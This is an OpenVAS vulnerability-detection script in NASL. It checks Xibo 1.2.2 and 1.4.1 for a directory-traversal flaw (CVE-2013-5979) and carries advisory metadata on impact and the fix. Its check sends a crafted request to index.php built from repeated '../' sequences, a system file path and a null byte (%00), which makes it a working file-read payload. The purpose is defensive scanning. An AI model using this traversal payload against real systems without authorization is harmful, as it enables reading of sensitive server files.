###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xibo_61352.nasl 5627 2017-03-20 15:22:38Z cfi $
#
# Xibo 'index.php' Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103797";

tag_insight = "Directory traversal vulnerabilities occur when user input is
used in the construction of a filename or directory path which is subsequently
used in some system function. If the input is not correctly validated or
directory permissions not correctly set, it may be possible to cause a different
file to be accessed other than that intended. This issue was exploited by adding a
null byte (%00) which resulted in the application ignoring the rest of the supplied
value after the null byte.";

tag_impact = "An attacker can exploit these issues using directory-traversal strings
to retrieve arbitrary files outside of the webserver root directory.
This may aid in further attacks";

tag_affected = "Xibo 1.2.2 and 1.4.1 are vulnerable; other versions may also be
affected.";

tag_summary = "Xibo is prone to multiple directory-traversal vulnerabilities because
it fails to properly sanitize user-supplied input.";

tag_solution = "Upgrade to Xibo 1.4.2 or later.";
tag_vuldetect = "Using directory-traversal strings in a HTTP GET request to determine
if it is possible to access a local file.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(61352);
 script_cve_id("CVE-2013-5979");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_version ("$Revision: 5627 $");

 script_name("Xibo 'index.php' Multiple Directory Traversal Vulnerabilities");


 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61352");
 
 script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:22:38 +0100 (Mon, 20 Mar 2017) $");
 script_tag(name:"creation_date", value:"2013-10-07 11:05:49 +0200 (Mon, 07 Oct 2013)");
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/xibo",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {

  url = dir + '/index.php';
 
  if(http_vuln_check(port:port, url:url,pattern:"<title>Xibo Admin - Please Login")) {

    foreach file (keys(files)) {

      url = dir + '/index.php?p=' + crap(data:"../", length:9*6) + files[file] + '%00index&amp;q=About&amp;ajax=true&amp;_=1355779988 ';

      if(http_vuln_check(port:port, url:url,pattern:file)) {
     
        security_message(port:port);
        exit(0);

      }
    }    
  }
}

exit(0);

